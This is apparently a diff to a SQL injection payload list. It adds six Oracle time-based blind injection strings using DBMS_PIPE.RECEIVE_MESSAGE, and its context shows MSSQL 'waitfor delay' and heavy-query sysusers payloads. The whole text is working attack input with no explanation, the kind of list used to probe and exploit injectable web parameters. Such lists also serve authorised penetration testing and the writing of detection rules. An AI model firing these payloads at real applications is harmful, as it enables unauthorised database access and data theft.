@@ -17,4 +17,17 @@ payload
 `') waitfor delay '0:0:5' --`
 `) waitfor delay '0:0:5' --`
 
+`OR 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5)`
+
+`' OR 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5) AND 'jmBZ'='jmBZ`
+
+`') OR 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5) AND ('jmBZ'='jmBZ`
+
+
+`AND 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5)`
+
+`' AND 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5) AND 'jmBZ'='jmBZ`
+
+`') AND 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5) AND ('jmBZ'='jmBZ`
+
 ` and 1733=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys9)  -- ' and 1= (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys9) -- s`
